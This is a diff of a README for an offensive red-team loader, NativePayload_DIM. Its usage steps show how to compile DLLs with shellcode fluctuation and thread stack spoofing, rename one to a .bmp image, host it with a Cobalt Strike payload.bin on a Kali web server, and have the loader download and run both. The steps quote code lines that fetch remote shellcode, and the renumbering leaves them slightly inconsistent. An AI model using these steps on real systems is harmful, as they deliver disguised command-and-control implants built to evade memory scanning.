@@ -30,13 +30,13 @@ ETW Memory Scanner => https://github.com/DamonMohammadbagher/ETWProcessMon2/tree
 #### Usage step-by-step:
 
       Step1: Compile C++ Codes to make Dll files [output should be dll type]
+            Step1-1: line 595 of main.cpp file in ShellcodeFluctuation-maste project is shellcode = downloadContent(L"http://192.168.56.104:8000/payload.bin") , you should change this ip address to cobaltstrike host ip address THEN compile ShellcodeFluctuation C++ code.
+            Step1-2: line 304 of main.cpp file in ThreadStackSpoofer-maste project is shellcode = downloadContent(L"http://192.168.56.104:8000/payload.bin") , you should change this ip address to cobaltstrike host ip address THEN compile ThreadStackSpoofer C++ code.
       Step2: rename "callstackspoofer.dll or ShellcodeFluctuation.dll" to NativeCode_SleepMask.bmp
-      Step3: upload bmp file to kali linux [cobaltstrike host]
-      Step4: line 595 of main.cpp file in ShellcodeFluctuation-maste project is shellcode = downloadContent(L"http://192.168.56.104:8000/payload.bin") , you should change this ip address to cobaltstrike host ip address THEN compile ShellcodeFluctuation C++ code.
-      Step4-1: line 304 of main.cpp file in ThreadStackSpoofer-maste project is shellcode = downloadContent(L"http://192.168.56.104:8000/payload.bin") , you should change this ip address to cobaltstrike host ip address THEN compile ThreadStackSpoofer C++ code.
-      Step5: line 38 of program.cs file in NativePayload_DIM project is "http://192.168.56.104:8000/NativeCode_SleepMask.bmp" , you should change this ip address to cobaltstrike host ip address THEN compile NativePayload_DIM C# code.
-      Step6: make raw payload.bin in cobaltstrike v4.0 host and both files in step3 and step5 should be in same folder & share them via webserver [you can use "Python2.7 -m SimpleHTTPServer" in kali linux]
-      Step7: Run NativePayload_DIM.exe 
+      Step3: upload bmp file to kali linux [cobaltstrike host]      
+      Step4: line 38 of program.cs file in NativePayload_DIM project is "http://192.168.56.104:8000/NativeCode_SleepMask.bmp" , you should change this ip address to cobaltstrike host ip address THEN compile NativePayload_DIM C# code.
+      Step4: make raw payload.bin in cobaltstrike v4.0 host and both files in step3 and step5 should be in same folder & share them via webserver [you can use "Python2.7 -m SimpleHTTPServer" in kali linux]
+      Step6: Run NativePayload_DIM.exe 
 
 ### NativePayload_DIM + loading Native Dll "ShellcodeFluctuation.dll" into local process
    ![](https://github.com/DamonMohammadbagher/NativePayload_DIM/blob/main/Pics/ShellcodeFluctuation1.png)
